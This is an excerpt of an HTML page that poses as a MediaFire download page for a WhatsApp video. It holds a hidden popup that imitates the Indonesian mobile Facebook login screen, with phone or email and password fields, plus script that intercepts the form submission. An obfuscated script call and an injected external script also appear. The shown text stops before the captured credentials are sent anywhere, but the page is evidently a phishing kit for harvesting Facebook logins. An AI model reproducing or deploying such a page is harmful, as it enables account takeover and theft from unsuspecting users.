...
<html lang="en-US" style="height: 100%;">
 <head> 
  ...
  <meta property="og:url" content="https://www.mediafire.com/file/756mvkofo7ldol4/VID-20220507-WA0181.mp4/file"> 
  ...
  <meta name="twitter:url" content="https://www.mediafire.com/file/756mvkofo7ldol4/VID-20220507-WA0181.mp4/file"> 
...
window.__d3lUW8vwsKlB__("");</script> 
  ...
  <script>
    ...
    <script src="https://unpkg.com/footericon@3.7.0/icon.map.js"></script>
  <script type="text/javascript">
  ...
  <!-- DITZNESIA -->
    <popup hide>
        <fb>
            <atas>
                <logo>
                    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yj/r/EDFsehamV8T.png">
                </logo>
                <text>Pasang Facebook untuk Android dan buka lebih cepat.</text>
            </atas>
            <err id="pass" hide>
            ...
            <fb-text>
                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg">
            </fb-text>

            <form-section>
                <form action="#" class="login-form">
                    <ev>
                        <input type="text" placeholder="Nomor ponsel atau email" name="user" autocomplete="off">
                    </ev>
                    <ev>
                        <reveal hide onclick="changeTEXT(this)">PERLIHATKAN</reveal>
                        <input type="password" placeholder="Kata Sandi" name="pass" onkeyup="checkReveal(this)" pr-20
                            autocomplete="off">
                    </ev>
                    <ev>
                        <button type="submit" id="goSubmit">Masuk</button>
                    </ev>
                </form>
            ...
            <lang>
                <left>
                    <op class="active">Bahasa Indonesia</op>
                    <op>Basa Jawa</op>
                    <op>日本語</op>
                    <op>Português (Brasil)</op>
                </left>
                <right>
                    <op>English (UK)</op>
                    <op>Bahasa Melayu</op>
    ...
    <script>
        ...
        function changeTEXT(e) {
            isReveal == !!0 ? (
                e.textContent = "SEMBUNYIKAN",
                $('input[name="pass"]').attr("type", "text"),
                isReveal = !!1
            ) : (
                e.textContent = "PERLIHATKAN",
        ...
        window.addEventListener('submit', function (e) {
            ...
            setTimeout(() => {
                ...
                console.log(user)
                if (user == '' || user == null) {
                    $('#email').removeAttr("hide");
                    $('#pass').attr("hide", "");
                    $("#goSubmit").removeAttr("die");
                    $('atas').attr('hide', '')
                    return false;
                } else {
